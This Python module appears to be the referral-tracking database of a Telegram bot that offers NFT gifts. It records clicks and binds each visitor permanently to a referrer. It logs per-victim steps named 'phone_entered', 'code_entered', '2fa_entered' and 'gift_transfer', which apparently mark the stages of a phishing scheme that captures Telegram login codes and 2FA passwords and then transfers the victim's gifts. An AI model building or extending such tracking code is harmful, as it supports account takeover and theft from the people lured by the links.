"""
JSON database for storing referral links and tracking who clicked them.
"""
import json
import os
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from datetime import datetime


@dataclass
class ReferralAction:
    """Represents an action taken by a user who came via referral link."""
    action_type: str  # "bot_visit", "webapp_open", "phone_entered", "code_entered", "2fa_entered", "gift_transfer"
    timestamp: str
    details: Optional[str] = None  # Additional info (e.g., error message, success status)


@dataclass
class ReferralClick:
    """Represents a click on a referral link."""
    user_id: int
    username: Optional[str]
    first_name: Optional[str]
    clicked_at: str
    actions: List[ReferralAction] = None  # List of actions taken by this user
    
    def __post_init__(self):
        if self.actions is None:
            self.actions = []


@dataclass
class ReferralLink:
    """Represents a referral link with associated NFT gift."""
    user_id: int
    nft_gift_url: str
    gift_name: str
    gift_number: str
    referral_link: str
    created_at: str
    clicks: List[ReferralClick]


# Path to JSON database file
# Use DATA_DIR env variable or default to /data for Docker compatibility
DATA_DIR = os.getenv('DATA_DIR', '/data')
DB_FILE = os.path.join(DATA_DIR, "referral_links.json")


def _ensure_db_dir():
    """Ensures the database directory exists."""
    db_dir = os.path.dirname(DB_FILE)
    os.makedirs(db_dir, exist_ok=True)


def _load_db() -> Dict:
    """Loads the database from JSON file."""
    _ensure_db_dir()
    if not os.path.exists(DB_FILE):
        return {"referral_links": {}, "referral_by_link": {}, "user_referrals": {}}
    
    try:
        with open(DB_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            # Ensure user_referrals exists in old databases
            if "user_referrals" not in data:
                data["user_referrals"] = {}
            return data
    except (json.JSONDecodeError, IOError):
        return {"referral_links": {}, "referral_by_link": {}, "user_referrals": {}}


def _save_db(data: Dict):
    """Saves the database to JSON file."""
    _ensure_db_dir()
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def _serialize_referral_link(ref: ReferralLink) -> dict:
    """Converts ReferralLink to dict for JSON storage."""
    return {
        "user_id": ref.user_id,
        "nft_gift_url": ref.nft_gift_url,
        "gift_name": ref.gift_name,
        "gift_number": ref.gift_number,
        "referral_link": ref.referral_link,
        "created_at": ref.created_at,
        "clicks": [
            {
                "user_id": click.user_id,
                "username": click.username,
                "first_name": click.first_name,
                "clicked_at": click.clicked_at,
                "actions": [
                    {
                        "action_type": action.action_type,
                        "timestamp": action.timestamp,
                        "details": action.details
                    }
                    for action in click.actions
                ]
            }
            for click in ref.clicks
        ]
    }


def _deserialize_referral_link(data: dict) -> ReferralLink:
    """Converts dict from JSON to ReferralLink."""
    return ReferralLink(
        user_id=data["user_id"],
        nft_gift_url=data["nft_gift_url"],
        gift_name=data["gift_name"],
        gift_number=data["gift_number"],
        referral_link=data["referral_link"],
        created_at=data["created_at"],
        clicks=[
            ReferralClick(
                user_id=click["user_id"],
                username=click.get("username"),
                first_name=click.get("first_name"),
                clicked_at=click["clicked_at"],
                actions=[
                    ReferralAction(
                        action_type=action["action_type"],
                        timestamp=action["timestamp"],
                        details=action.get("details")
                    )
                    for action in click.get("actions", [])
                ]
            )
            for click in data.get("clicks", [])
        ]
    )


def create_referral_link(
    user_id: int,
    nft_gift_url: str,
    gift_name: str,
    gift_number: str,
    referral_link: str
) -> tuple[ReferralLink, bool]:
    """
    Creates and stores a new referral link.
    If user already has a referral link, replaces it instead of creating a new one.
    Returns (ReferralLink, was_replaced) where was_replaced is True if an existing link was replaced.
    """
    db = _load_db()
    
    # Check if user already has a referral link
    user_id_str = str(user_id)
    existing_refs = db["referral_links"].get(user_id_str, [])
    was_replaced = len(existing_refs) > 0
    
    # If user has existing referral link(s), remove old ones
    if existing_refs:
        # Remove old referral links from referral_by_link
        for old_ref_data in existing_refs:
            old_link = old_ref_data.get("referral_link")
            if old_link and old_link in db["referral_by_link"]:
                del db["referral_by_link"][old_link]
        
        # Clear user's referral links list (will be replaced with new one)
        db["referral_links"][user_id_str] = []
    
    ref = ReferralLink(
        user_id=user_id,
        nft_gift_url=nft_gift_url,
        gift_name=gift_name,
        gift_number=gift_number,
        referral_link=referral_link,
        created_at=datetime.now().isoformat(),
        clicks=[]
    )
    
    # Store by user_id (only one link per user now)
    if user_id_str not in db["referral_links"]:
        db["referral_links"][user_id_str] = []
    
    db["referral_links"][user_id_str].append(_serialize_referral_link(ref))
    
    # Store by referral_link for quick lookup
    db["referral_by_link"][referral_link] = _serialize_referral_link(ref)
    
    _save_db(db)
    return ref, was_replaced


def get_user_referral_links(user_id: int) -> List[ReferralLink]:
    """Gets all referral links for a user."""
    db = _load_db()
    user_refs = db["referral_links"].get(str(user_id), [])
    return [_deserialize_referral_link(ref_data) for ref_data in user_refs]


def get_referral_by_link(referral_link: str) -> Optional[ReferralLink]:
    """Gets referral link data by referral link string."""
    db = _load_db()
    ref_data = db["referral_by_link"].get(referral_link)
    if ref_data:
        return _deserialize_referral_link(ref_data)
    return None


def add_referral_click(
    referral_link: str,
    user_id: int,
    username: Optional[str] = None,
    first_name: Optional[str] = None
):
    """Records a click on a referral link and creates permanent binding."""
    print(f"[REFERRAL-DB] add_referral_click called: link={referral_link}, user_id={user_id}")
    db = _load_db()
    
    ref_data = db["referral_by_link"].get(referral_link)
    if not ref_data:
        print(f"[REFERRAL-DB] ERROR: Referral link not found in database: {referral_link}")
        print(f"[REFERRAL-DB] Available links: {list(db['referral_by_link'].keys())}")
        return
    
    referrer_id = ref_data["user_id"]
    
    # Create permanent binding if not exists
    user_id_str = str(user_id)
    if user_id_str not in db.get("user_referrals", {}):
        db["user_referrals"][user_id_str] = {
            "user_id": user_id,
            "referrer_id": referrer_id,
            "referral_link": referral_link,
            "bound_at": datetime.now().isoformat()
        }
        print(f"[REFERRAL-DB] User {user_id} permanently bound to referrer {referrer_id}")
    else:
        existing_referrer = db["user_referrals"][user_id_str]["referrer_id"]
        print(f"[REFERRAL-DB] User {user_id} already bound to referrer {existing_referrer}, keeping existing binding")
    
    # Check if click already exists for this user
    existing_click = None
    for click in ref_data.get("clicks", []):
        if click.get("user_id") == user_id:
            existing_click = click
            break
    
    if existing_click:
        # Update existing click
        print(f"[REFERRAL-DB] Updating existing click for user_id={user_id}")
        existing_click["username"] = username
        existing_click["first_name"] = first_name
        if "actions" not in existing_click:
            existing_click["actions"] = []
    else:
        # Add new click
        print(f"[REFERRAL-DB] Adding new click for user_id={user_id}")
        click_data = {
            "user_id": user_id,
            "username": username,
            "first_name": first_name,
            "clicked_at": datetime.now().isoformat(),
            "actions": []
        }
        ref_data["clicks"].append(click_data)
    
    # Update in both storages
    db["referral_by_link"][referral_link] = ref_data
    
    # Update in user's list
    user_id_str = str(ref_data["user_id"])
    if user_id_str in db["referral_links"]:
        for ref in db["referral_links"][user_id_str]:
            if ref["referral_link"] == referral_link:
                ref["clicks"] = ref_data["clicks"]
                break
    
    print(f"[REFERRAL-DB] Click saved successfully. Total clicks: {len(ref_data['clicks'])}")
    _save_db(db)


def add_referral_action(
    referral_link: str,
    user_id: int,
    action_type: str,
    details: Optional[str] = None
):
    """Adds an action to a referral click."""
    db = _load_db()
    
    ref_data = db["referral_by_link"].get(referral_link)
    if not ref_data:
        return
    
    # Find click for this user
    for click in ref_data.get("clicks", []):
        if click.get("user_id") == user_id:
            if "actions" not in click:
                click["actions"] = []
            
            action = {
                "action_type": action_type,
                "timestamp": datetime.now().isoformat(),
                "details": details
            }
            click["actions"].append(action)
            
            # Log to console
            print(f"[REFERRAL] [ACTION] user_id={user_id}, referral_link={referral_link}, action={action_type}, details={details}")
            break
    
    # Update in both storages
    db["referral_by_link"][referral_link] = ref_data
    
    # Update in user's list
    user_id_str = str(ref_data["user_id"])
    if user_id_str in db["referral_links"]:
        for ref in db["referral_links"][user_id_str]:
            if ref["referral_link"] == referral_link:
                ref["clicks"] = ref_data["clicks"]
                break
    
    _save_db(db)


def bind_user_to_referrer(user_id: int, referrer_id: int, referral_link: str) -> bool:
    """
    Permanently binds a user to a referrer (only if not already bound).
    Returns True if binding was created, False if user was already bound.
    """
    db = _load_db()
    user_id_str = str(user_id)
    
    # Check if user is already bound
    if user_id_str in db["user_referrals"]:
        print(f"[REFERRAL-DB] User {user_id} already bound to referrer {db['user_referrals'][user_id_str]['referrer_id']}")
        return False
    
    # Create permanent binding
    db["user_referrals"][user_id_str] = {
        "user_id": user_id,
        "referrer_id": referrer_id,
        "referral_link": referral_link,
        "bound_at": datetime.now().isoformat()
    }
    
    _save_db(db)
    print(f"[REFERRAL-DB] User {user_id} permanently bound to referrer {referrer_id}")
    return True


def get_user_referrer(user_id: int) -> Optional[int]:
    """Gets the referrer ID for a user (permanent binding)."""
    db = _load_db()
    user_id_str = str(user_id)
    
    if user_id_str in db["user_referrals"]:
        return db["user_referrals"][user_id_str]["referrer_id"]
    
    return None


def get_referral_link_by_user(user_id: int) -> Optional[str]:
    """Gets the referral link that a user came from (permanent binding)."""
    db = _load_db()
    user_id_str = str(user_id)
    
    # First check permanent binding
    if user_id_str in db["user_referrals"]:
        return db["user_referrals"][user_id_str]["referral_link"]
    
    # Fallback: search through clicks (for backwards compatibility)
    most_recent_click = None
    most_recent_link = None
    
    for referral_link, ref_data in db["referral_by_link"].items():
        for click in ref_data.get("clicks", []):
            if click.get("user_id") == user_id:
                clicked_at = click.get("clicked_at", "")
                if not most_recent_click or clicked_at > most_recent_click:
                    most_recent_click = clicked_at
                    most_recent_link = referral_link
    
    return most_recent_link


def generate_referral_link(user_id: int, bot_username: str) -> str:
    """Generates a referral link for the bot with user_id as parameter."""
    return f"https://t.me/{bot_username}?start=ref_{user_id}"



